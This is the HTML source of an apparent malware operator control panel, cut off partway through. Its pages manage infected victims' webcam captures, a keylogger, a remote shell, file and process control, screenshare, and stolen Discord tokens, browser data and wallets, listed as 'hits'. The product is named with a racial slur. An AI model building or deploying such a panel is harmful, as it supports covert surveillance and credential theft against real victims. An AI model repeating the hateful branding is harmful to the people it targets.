<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Niggaware Enterprise - Control Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <!-- Socket.IO for live streaming -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <!-- Cesium removed to prevent large WebAssembly usage and OOM crashes -->
    <!-- Cesium removed: <script src="https://cesium.com/downloads/cesiumjs/releases/1.113/Build/Cesium/Cesium.js"></script> -->
    <!-- Cesium removed: <link href="https://cesium.com/downloads/cesiumjs/releases/1.113/Build/Cesium/Widgets/widgets.css" rel="stylesheet"> -->
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg-primary: #050505;
            --bg-secondary: #0a0a0a;
            --bg-card: #111111;
            --bg-hover: #1a1a1a;
            --accent: #00ff9d; /* Cyber Green */
            --accent-hover: #00cc7d;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --text-primary: #ffffff;
            --text-secondary: #a1a1aa;
            --text-muted: #52525b;
            --border: #27272a;
            --mc-green: #22c55e;
            --discord-blue: #5865f2;
            --font-mono: 'JetBrains Mono', monospace;
        }
        body { 
            font-family: 'Inter', sans-serif; 
            background: var(--bg-primary); 
            background-image: radial-gradient(circle at 50% 0%, #1a2e24 0%, #050505 60%);
            background-attachment: fixed;
            color: var(--text-primary); 
            min-height: 100vh; 
        }
        
        /* Animations */
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes glow { 0%, 100% { box-shadow: 0 0 5px var(--accent); } 50% { box-shadow: 0 0 20px var(--accent), 0 0 30px var(--accent); } }
        @keyframes slideInLeft { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
        @keyframes scaleIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
        
        .animate-fade { animation: fadeIn 0.4s ease-out; }
        .animate-slide { animation: slideInLeft 0.3s ease-out; }
        .animate-scale { animation: scaleIn 0.3s ease-out; }
        .animate-pulse { animation: pulse 2s infinite; }
        .animate-glow { animation: glow 2s infinite; }
        
        /* Login */
        .login-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at center, #2e1065 0%, #0a0a0c 100%); }
        .login-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); backdrop-filter: blur(10px); }
        .login-logo { text-align: center; margin-bottom: 32px; }
        .login-logo i { font-size: 48px; color: var(--accent); margin-bottom: 16px; display: block; text-shadow: 0 0 20px var(--accent); }
        .login-logo h1 { font-size: 24px; margin-bottom: 8px; font-weight: 700; letter-spacing: -0.5px; }
        .login-logo p { color: var(--text-secondary); font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; color: var(--text-secondary); font-weight: 500; }
        .form-group input { width: 100%; padding: 12px 16px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); font-size: 14px; transition: all 0.2s; }
        .form-group input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 2px rgba(139, 92, 246, 0.2); }
        .btn { padding: 12px 20px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; gap: 8px; justify-content: center; }
        .btn-primary { background: var(--accent); color: white; }
        .btn-primary:hover { background: var(--accent-hover); box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3); }
        .btn-secondary { background: var(--bg-hover); color: var(--text-primary); border: 1px solid var(--border); }
        .btn-secondary:hover { background: var(--border); }
        .btn-danger { background: var(--danger); color: white; }
        .btn-danger:hover { background: #dc2626; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .btn-icon { padding: 8px; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
        .error-msg { background: rgba(239,68,68,0.1); border: 1px solid var(--danger); color: var(--danger); padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: none; }
        .register-link { text-align: center; margin-top: 20px; color: var(--text-secondary); font-size: 14px; }
        
        /* App */
        .app { display: none; min-height: 100vh; }
        .sidebar { position: fixed; left: 0; top: 0; bottom: 0; width: 260px; background: rgba(19, 19, 22, 0.95); backdrop-filter: blur(10px); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }
        .sidebar-logo { display: flex; align-items: center; gap: 12px; padding-bottom: 24px; border-bottom: 1px solid var(--border); margin-bottom: 16px; position: relative; flex-shrink: 0; }
        .sidebar-logo i { font-size: 24px; color: var(--accent); }
        .sidebar-logo span { font-size: 18px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
        .sidebar nav { flex: 1; overflow-y: auto; overflow-x: hidden; padding-right: 8px; margin-right: -8px; scrollbar-width: thin; scrollbar-color: var(--border) transparent; }
        .sidebar nav::-webkit-scrollbar { width: 6px; }
        .sidebar nav::-webkit-scrollbar-track { background: transparent; }
        .sidebar nav::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
        .sidebar nav::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
        .nav-item { display: flex; align-items: center; gap: 12px; padding: 12px 16px; border-radius: 8px; color: var(--text-secondary); cursor: pointer; transition: all 0.2s; margin-bottom: 4px; font-weight: 500; }
        .nav-item:hover { background: var(--bg-hover); color: var(--text-primary); }
        .nav-item.active { background: var(--accent); color: white; box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3); }
        .nav-item i { width: 20px; text-align: center; }
        .nav-section { font-size: 11px; text-transform: uppercase; color: var(--text-muted); padding: 16px 16px 8px; letter-spacing: 0.5px; font-weight: 700; }
        .user-info { margin-top: auto; padding: 16px; background: var(--bg-card); border-radius: 8px; flex-shrink: 0; border: 1px solid var(--border); }
        .user-info-name { font-weight: 600; margin-bottom: 4px; }
        .user-info-role { font-size: 12px; color: var(--accent); }
        
        .main { margin-left: 260px; padding: 32px; display: flex; flex-direction: column; height: 100vh; background: transparent; }
        .page { display: none; flex: 1; overflow: auto; }
        .page.active { display: flex; flex-direction: column; }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; flex-shrink: 0; }
        .page-title { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
        
        /* Stats */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 24px; margin-bottom: 32px; }
        .stat-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; padding: 24px; transition: transform 0.2s; }
        .stat-card:hover { transform: translateY(-2px); border-color: var(--accent); }
        .stat-card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
        .stat-card-icon { width: 48px; height: 48px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
        .stat-card-icon.purple { background: rgba(139, 92, 246, 0.1); color: var(--accent); }
        .stat-card-icon.green { background: rgba(16, 185, 129, 0.1); color: var(--success); }
        .stat-card-icon.yellow { background: rgba(245, 158, 11, 0.1); color: var(--warning); }
        .stat-card-icon.red { background: rgba(239, 68, 68, 0.1); color: var(--danger); }
        .stat-card-icon.blue { background: rgba(88, 101, 242, 0.1); color: var(--discord-blue); }
        .stat-card-icon.mc { background: rgba(34, 197, 94, 0.1); color: var(--mc-green); }
        .stat-card-value { font-size: 32px; font-weight: 700; letter-spacing: -1px; }
        .stat-card-label { font-size: 14px; color: var(--text-secondary); margin-top: 4px; }
        
        /* Log Cards */
        .logs-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        .log-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; transition: all 0.2s; }
        .log-card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 10px 30px -10px rgba(0,0,0,0.5); }
        .log-card-header { padding: 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background: var(--bg-secondary); }
        .log-card-type { display: flex; align-items: center; gap: 10px; }
        .log-type-badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
        .log-type-badge.minecraft { background: rgba(34, 197, 94, 0.1); color: var(--mc-green); }
        .log-type-badge.discord { background: rgba(88, 101, 242, 0.1); color: var(--discord-blue); }
        .log-type-badge.browser { background: rgba(245, 158, 11, 0.1); color: var(--warning); }
        .log-type-badge.wallet { background: rgba(239, 68, 68, 0.1); color: var(--danger); }
        .log-type-badge.system { background: rgba(139, 92, 246, 0.1); color: var(--accent); }
        .log-type-badge.zip { background: rgba(16, 185, 129, 0.1); color: var(--success); }
        .log-card-actions { display: flex; gap: 8px; }
        .log-card-body { padding: 16px; }
        .log-info-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; font-size: 13px; }
        .log-info-row i { color: var(--text-muted); width: 16px; text-align: center; }
        .log-info-row span { color: var(--text-secondary); }
        .log-preview { background: var(--bg-primary); border-radius: 8px; padding: 12px; margin-top: 12px; border: 1px solid var(--border); }
        .log-preview-title { font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; font-weight: 600; }
        .log-preview-content { font-family: 'Monaco', 'Menlo', monospace; font-size: 12px; color: var(--text-primary); word-break: break-all; }
        .log-preview-copy { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
        .copy-btn { background: var(--bg-hover); border: 1px solid var(--border); color: var(--text-secondary); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; transition: all 0.2s; }
        .copy-btn:hover { background: var(--accent); color: white; border-color: var(--accent); }
        .copy-btn.copied { background: var(--success); color: white; border-color: var(--success); }
        
        /* Enhanced Discord Styles */
        .discord-avatar { width: 64px; height: 64px; border-radius: 50%; border: 3px solid var(--discord-blue); }
        .discord-banner { background-size: cover; background-position: center; min-height: 120px; border-radius: 8px; margin-bottom: 16px; }
        .discord-badge { background: var(--accent); color: white; padding: 4px 8px; border-radius: 12px; font-size: 11px; font-weight: 500; display: inline-block; margin: 2px; }
        .discord-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px; }
        .discord-info-card { background: var(--bg-secondary); padding: 16px; border-radius: 8px; }
        .discord-info-header { font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
        .discord-info-content { font-size: 13px; line-height: 1.5; }
        .discord-token-container { background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px; }
        .discord-token-header { font-size: 11px; color: var(--text-muted); margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
        .discord-token-content { font-family: monospace; font-size: 11px; word-break: break-all; color: var(--discord-blue); background: var(--bg-primary); padding: 12px; border-radius: 6px; max-height: 120px; overflow-y: auto; }
        .discord-enhanced-badge { background: var(--success); color: white; padding: 2px 6px; border-radius: 10px; font-size: 9px; }
        .discord-basic-badge { background: var(--warning); color: white; padding: 2px 6px; border-radius: 10px; font-size: 9px; }
        .rare-friend-card { padding: 8px; margin-bottom: 6px; background: var(--bg-primary); border-radius: 6px; border-left: 3px solid var(--danger); }
        .rare-friend-name { font-weight: 500; margin-bottom: 4px; }
        .rare-friend-badges { font-size: 11px; color: var(--text-muted); }
        .log-card-footer { padding: 12px 16px; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: var(--text-muted); }
        
        /* Filter */
        .filter-bar { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
        .filter-btn { padding: 8px 16px; border-radius: 20px; background: var(--bg-card); border: 1px solid var(--border); color: var(--text-secondary); cursor: pointer; font-size: 13px; transition: all 0.2s; font-weight: 500; }
        .filter-btn:hover { border-color: var(--accent); color: var(--text-primary); }
        .filter-btn.active { background: var(--accent); border-color: var(--accent); color: white; }
        
        /* Table */
        .table-container { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: auto; max-height: calc(100vh - 250px); }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 16px; text-align: left; border-bottom: 1px solid var(--border); }
        th { background: var(--bg-secondary); font-size: 12px; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.5px; }
        tr:hover { background: var(--bg-hover); }
        
        /* Build Key */
        .build-key-box { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
        .build-key-label { font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; font-weight: 600; }
        .build-key-value { font-family: 'Monaco', monospace; font-size: 14px; color: var(--accent); word-break: break-all; }
        
        /* Toast */
        .toast { position: fixed; bottom: 24px; right: 24px; padding: 12px 20px; border-radius: 8px; font-size: 14px; z-index: 1000; animation: slideIn 0.3s; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); font-weight: 500; }
        .toast.success { background: var(--success); color: white; }
        .toast.error { background: var(--danger); color: white; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        
        /* Modal */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 100; align-items: center; justify-content: center; backdrop-filter: blur(4px); }
        .modal.active { display: flex; }
        .modal-content { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; width: 90%; max-width: 600px; max-height: 80vh; overflow: auto; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        .modal-header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .modal-body { padding: 20px; }
        .modal-close { background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 20px; transition: color 0.2s; }
        .modal-close:hover { color: var(--text-primary); }
        
        /* Screenshare Modal - Improved */
        .screenshare-modal { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.95); z-index: 10000; flex-direction: column; backdrop-filter: blur(4px); }
        .screenshare-modal.active { display: flex; animation: fadeIn 0.2s ease; }
        .screenshare-modal-header { padding: 12px 20px; background: var(--bg-card); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; gap: 16px; }
        .screenshare-modal-title { display: flex; align-items: center; gap: 12px; color: var(--text-primary); font-weight: 600; flex-shrink: 0; }
        .screenshare-modal-status { display: flex; align-items: center; gap: 8px; font-size: 13px; flex-shrink: 0; }
        .screenshare-modal-status.streaming { color: #22c55e; }
        .screenshare-modal-status.stopped { color: var(--text-muted); }
        .screenshare-modal-header-controls { display: flex; align-items: center; gap: 12px; }
        .screenshare-modal-close { background: var(--danger); border: none; color: white; cursor: pointer; font-size: 14px; padding: 8px 16px; border-radius: 6px; display: flex; align-items: center; gap: 6px; transition: all 0.2s; }
        .screenshare-modal-close:hover { background: #dc2626; transform: scale(1.05); }
        .screenshare-modal-body { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; padding: 20px; cursor: default; min-height: 0; }
        .screenshare-modal-image { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; transition: opacity 0.15s ease; box-shadow: 0 0 40px rgba(0,0,0,0.5); }
        .screenshare-modal-controls { padding: 12px 20px; background: var(--bg-card); border-top: 1px solid var(--border); display: flex; justify-content: center; align-items: center; gap: 16px; flex-shrink: 0; flex-wrap: wrap; }
        .screenshare-fps { position: absolute; bottom: 80px; right: 30px; background: rgba(0,0,0,0.7); color: #22c55e; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-family: monospace; z-index: 10; }
        /* Volume Control */
        .volume-control { display: flex; align-items: center; gap: 8px; background: var(--bg-secondary); padding: 6px 12px; border-radius: 8px; }
        .volume-control i { color: var(--text-muted); font-size: 14px; cursor: pointer; }
        .volume-control i:hover { color: var(--text-primary); }
        .volume-slider { width: 100px; height: 4px; accent-color: var(--accent); cursor: pointer; }
        .volume-value { font-size: 11px; color: var(--text-muted); min-width: 30px; text-align: center; }
        
        .admin-only { display: none; }
        .is-admin .admin-only { display: flex; }
        
        /* Online Players */
        .online-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 16px; }
        .online-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 16px; transition: all 0.3s; animation: fadeIn 0.4s ease-out; }
        .online-card:hover { border-color: var(--accent); transform: translateY(-2px); }
        .online-card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
        .online-avatar { width: 48px; height: 48px; border-radius: 8px; background: var(--bg-secondary); display: flex; align-items: center; justify-content: center; font-size: 24px; color: var(--accent); }
        .online-status { width: 12px; height: 12px; background: var(--success); border-radius: 50%; animation: pulse 2s infinite; box-shadow: 0 0 10px var(--success); }
        .online-name { font-weight: 600; font-size: 16px; }
        .online-server { font-size: 13px; color: var(--text-secondary); display: flex; align-items: center; gap: 6px; }
        .online-server i { color: var(--mc-green); }
        .online-info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 12px; color: var(--text-muted); }
        .online-info-item { display: flex; align-items: center; gap: 6px; }
        .online-count-badge { background: var(--success); color: white; padding: 4px 12px; border-radius: 20px; font-size: 14px; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; animation: glow 2s infinite; }
        
        /* Webcam Gallery - Improved */
        .webcam-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .webcam-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; transition: all 0.3s; animation: scaleIn 0.4s ease-out; }
        .webcam-card:hover { border-color: var(--accent); transform: scale(1.02); box-shadow: 0 12px 40px rgba(0,0,0, 0.2); }
        .webcam-card-header { padding: 12px 16px; background: var(--bg-secondary); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .webcam-card-title { font-weight: 600; font-size: 13px; color: var(--text-primary); display: flex; align-items: center; gap: 8px; }
        .webcam-card-live { background: #ef4444; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
        .webcam-card-live i { animation: pulse 1s infinite; font-size: 6px; }
        .webcam-image { width: 100%; aspect-ratio: 16/9; object-fit: cover; background: var(--bg-secondary); cursor: pointer; transition: all 0.3s; display: block; }
        .webcam-image:hover { filter: brightness(1.1); }
        .webcam-info { padding: 12px 16px; display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
        .webcam-victim { font-weight: 600; font-size: 13px; flex: 1; min-width: 120px; color: var(--text-primary); }
        .webcam-meta { display: flex; gap: 12px; flex-wrap: wrap; }
        .webcam-meta-item { font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; }
        .webcam-time { font-size: 11px; color: var(--text-muted); }
        .webcam-empty { text-align: center; padding: 80px 20px; color: var(--text-muted); }
        .webcam-empty i { font-size: 64px; margin-bottom: 20px; opacity: 0.4; }
        .webcam-badge { background: var(--bg-hover); padding: 4px 10px; border-radius: 6px; font-size: 11px; color: var(--text-secondary); }
        .webcam-actions { display: flex; gap: 8px; padding: 12px 16px; border-top: 1px solid var(--border); background: var(--bg-secondary); }
        .webcam-actions .btn { flex: 1; font-size: 12px; padding: 8px; }
        
        /* Lightbox */
        .lightbox { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; align-items: center; justify-content: center; }
        .lightbox.active { display: flex; animation: fadeIn 0.2s; }
        .lightbox img { max-width: 95vw; max-height: 90vh; border-radius: 12px; box-shadow: 0 0 60px rgba(0,0,0,0.5); }
        .lightbox-close { position: absolute; top: 20px; right: 30px; color: white; font-size: 36px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; }
        .lightbox-close:hover { opacity: 1; }
        .lightbox-info { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--bg-card); padding: 16px 24px; border-radius: 12px; color: var(--text-primary); font-size: 14px; }
        
        /* Nav item with badge */
        .nav-badge { background: var(--success); color: white; font-size: 10px; padding: 2px 6px; border-radius: 10px; margin-left: auto; animation: pulse 2s infinite; }
        
        /* Remote Control Styles */
        .remote-action-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 12px; margin-bottom: 24px; }
        .remote-action-btn { background: linear-gradient(135deg, var(--bg-card), var(--bg-hover)); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s; }
        .remote-action-btn:hover { border-color: var(--accent); transform: translateY(-3px); box-shadow: 0 8px 25px rgba(139, 92, 246, 0.2); }
        .remote-action-btn i { font-size: 28px; color: var(--accent); margin-bottom: 12px; display: block; }
        .remote-action-btn span { font-size: 13px; color: var(--text-secondary); }
        
        /* Live Stream Container */
        .stream-container { background: #000; border: 2px solid var(--border); border-radius: 16px; overflow: hidden; position: relative; }
        .stream-container:hover { border-color: var(--accent); }
        .stream-live-badge { position: absolute; top: 16px; left: 16px; background: #ef4444; color: white; padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 6px; z-index: 10; }
        .stream-live-badge i { animation: pulse 1s infinite; }
        
        /* Shell Terminal */
        .terminal-container { background: #0d1117; border: 2px solid #30363d; border-radius: 12px; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; }
        .terminal-header { background: #161b22; padding: 8px 16px; border-bottom: 1px solid #30363d; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
        .terminal-dot.red { background: #ff5f56; }
        .terminal-dot.yellow { background: #ffbd2e; }
        .terminal-dot.green { background: #27c93f; }
        .terminal-title { color: #8b949e; font-size: 12px; margin-left: 12px; }
        
        /* File Manager */
        .file-icon { font-size: 18px; margin-right: 8px; }
        .file-icon.folder { color: #f59e0b; }
        .file-icon.file { color: #60a5fa; }
        .file-row { cursor: pointer; transition: background 0.2s; }
        .file-row:hover { background: var(--bg-hover); }
        
        .breadcrumb-item { cursor: pointer; color: var(--text-secondary); transition: color 0.2s; }
        .breadcrumb-item:hover { color: var(--accent); text-decoration: underline; }
    </style>
    <script>
        // Define window.login immediately in HEAD so buttons can use it (safe and minimal)
        const API = '';
        let token = localStorage.getItem('token');

        window.login = async function() {
            console.log('Login attempt...');
            try {
                const usernameInput = document.getElementById('loginUsername');
                const passwordInput = document.getElementById('loginPassword');
                if (!usernameInput || !passwordInput) {
                    alert('Input fields not found!');
                    return;
                }
                const username = usernameInput.value;
                const password = passwordInput.value;

                const res = await fetch(API + '/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                }).then(r => r.json());

                if (res.success) {
                    token = res.token;
                    localStorage.setItem('token', token);
                    if (window.showApp) window.showApp();
                } else {
                    const err = document.getElementById('loginError');
                    if (err) {
                        err.textContent = res.error;
                        err.style.display = 'block';
                    } else {
                        alert(res.error);
                    }
                }
            } catch (e) {
                console.error('Login error:', e);
                alert('Login failed: ' + e.message);
            }
        };
    </script>
</head>
<body>
    <!-- Login -->
    <div class="login-container" id="loginPage">
        <div class="login-box">
            <div class="login-logo">
                <i class="fas fa-crown"></i>
                <h1>Niggaware Premium</h1>
                <p>Premium Control Panel</p>
            </div>
            <div class="error-msg" id="loginError"></div>
            <div class="form-group">
                <label><i class="fas fa-user"></i> Username</label>
                <input type="text" id="loginUsername" placeholder="Enter username">
            </div>
            <div class="form-group">
                <label><i class="fas fa-lock"></i> Password</label>
                <input type="password" id="loginPassword" placeholder="Enter password" onkeypress="if(event.key==='Enter'&&window.login)window.login()">
            </div>
            <button class="btn btn-primary" style="width: 100%;" onclick="if(window.login)window.login();else alert('Login function not ready')">
                <i class="fas fa-sign-in-alt"></i> Login
            </button>
            <div class="register-link">
                Need an account? <span>Contact Admin</span>
            </div>
        </div>
    </div>

    <!-- App -->
    <div class="app" id="app">
        <aside class="sidebar">
            <div class="sidebar-logo">
                <i class="fas fa-crown"></i>
                <span>Niggaware Premium</span>
            </div>
            <nav>
                <div class="nav-item active" onclick="showPage('dashboard')">
                    <i class="fas fa-home"></i> Dashboard
                </div>
                <div class="nav-item" onclick="showPage('online')">
                    <i class="fas fa-signal"></i> Online Players
                    <span class="nav-badge" id="onlineCountBadge">0</span>
                </div>
                <div class="nav-item" onclick="showPage('webcam')">
                    <i class="fas fa-camera"></i> Webcam
                </div>
                <div class="nav-section">Remote Control</div>
                <div class="nav-item" onclick="showPage('remote')">
                    <i class="fas fa-desktop"></i> Remote Panel
                </div>
                <div class="nav-item" onclick="showPage('screenshare')">
                    <i class="fas fa-tv"></i> Screenshare
                </div>
                <div class="nav-item" onclick="showPage('keylogger')">
                    <i class="fas fa-keyboard"></i> Keylogger
                </div>
                <div class="nav-item" onclick="showPage('shell')">
                    <i class="fas fa-terminal"></i> Remote Shell
                </div>
                <div class="nav-item" onclick="showPage('files')">
                    <i class="fas fa-folder-open"></i> File Manager
                </div>
                <div class="nav-item" onclick="showPage('processes')">
                    <i class="fas fa-tasks"></i> Process Manager
                </div>
                <div class="nav-item" onclick="showPage('discord')">
                    <i class="fab fa-discord"></i> Discord Tokens
                </div>
                <div class="nav-item" onclick="showPage('logs')">
                    <i class="fas fa-list"></i> Logs
                </div>
                <div class="nav-item" onclick="showPage('settings')">
                    <i class="fas fa-cog"></i> Settings
                </div>
                <div class="nav-section admin-only">Admin</div>
                <div class="nav-item admin-only" onclick="showPage('users')">
                    <i class="fas fa-users"></i> Users
                </div>
                <div class="nav-item admin-only" onclick="showPage('login-logs')">
                    <i class="fas fa-sign-in-alt"></i> Login Logs
                </div>
                <div class="nav-item admin-only" onclick="showPage('alllogs')">
                    <i class="fas fa-database"></i> All Logs
                </div>
                <div class="nav-item admin-only" onclick="showPage('trash')">
                    <i class="fas fa-trash-restore"></i> Trash
                </div>
                <div class="nav-item admin-only" onclick="showPage('audit')">
                    <i class="fas fa-clipboard-list"></i> Audit Log
                </div>
            </nav>
            <div class="user-info">
                <div class="user-info-name" id="userName">User</div>
                <div class="user-info-role" id="userRole">Member</div>
            </div>
        </aside>

        <main class="main">
            <!-- Dashboard -->
            <div class="page active" id="page-dashboard">
                <div class="page-header">
                    <h1 class="page-title">Dashboard</h1>
                </div>
                <div class="stats-grid" id="statsGrid"></div>
                <h3 style="margin-bottom: 16px;">Recent Hits</h3>
                <div class="logs-grid" id="recentLogs"></div>
            </div>

            <!-- Online Players -->
            <div class="page" id="page-online">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-signal" style="color: var(--success); margin-right: 10px;"></i>Online Players</h1>
                    <div style="display: flex; gap: 12px; align-items: center;">
                        <span class="online-count-badge"><i class="fas fa-circle"></i> <span id="onlineCount">0</span> Online</span>
                        <button class="btn btn-secondary" onclick="loadOnlinePlayers()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                    </div>
                </div>
                <div class="online-grid" id="onlinePlayersGrid">
                    <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                        <i class="fas fa-spinner fa-spin" style="font-size: 32px; margin-bottom: 16px;"></i>
                        <p>Loading online players...</p>
                    </div>
                </div>
            </div>

            <!-- Webcam -->
            <div class="page" id="page-webcam">
                <div class="page-header">
                    <h1 class="page-title"><i class="fas fa-camera" style="color: var(--warning); margin-right: 10px;"></i>Webcam Captures</h1>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-secondary" onclick="loadWebcamImages()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                        <button class="btn btn-primary" onclick="downloadAllWebcams()" id="downloadAllWebcamsBtn">
                            <i class="fas fa-download"></i> Download All
                        </button>
                    </div>
                </div>
                <div class="stats-grid" style="margin-bottom: 24px;">
                    <div class="stat-card animate-fade">
                        <div class="stat-card-header">
                            <div class="stat-card-icon yellow"><i class="fas fa-camera"></i></div>
                        </div>
                        <div class="stat-card-value" id="webcamTotal">0</div>
                        <div class="stat-card-label">Total Captures</div>
                    </div>
                    <div class="stat-card animate-fade">
                        <div class="stat-card-header">
                            <div class="stat-card-icon green"><i class="fas fa-clock"></i></div>
                        </div>
                        <div class="stat-card-value" id="webcamToday">0</div>
                        <div class="stat-card-label">Today</div>
                    </div>
                    <div class="stat-card animate-fade">
                        <div class="stat-card-header">
                            <div class="stat-card-icon blue"><i class="fas fa-users"></i></div>
                        </div>
                        <div class="stat-card-value" id="webcamVictims">0</div>
                        <div class="stat-card-label">Unique Victims</div>
                    </div>
                </div>
                <div class="webcam-grid" id="webcamGrid">
                    <div class="webcam-empty" style="grid-column: 1/-1;">
                        <i class="fas fa-camera-retro"></i>
                        <p>No webcam captures yet</p>
                    </div>
                </div>
                
                <!-- Lightbox for fullsize image -->
                <div class="lightbox" id="webcamLightbox" onclick="closeLightbox()">
                    <span class="lightbox-close" onclick="closeLightbox()">&times;</span>
                    <img id="lightboxImage" src="" alt="Webcam Capture">
                    <div class="lightbox-info" id="lightboxInfo"></div>
                </div>
            </div>

            <!-- Discord Tokens -->
            <div class="page" id="page-discord">
                <div class="page-header">
                    <h1 class="page-title"><i class="fab fa-discord" style="color: var(--discord-blue); margin-right: 10px;"></i>Discord Tokens</h1>
                    <div style="display: flex; gap: 8px;">
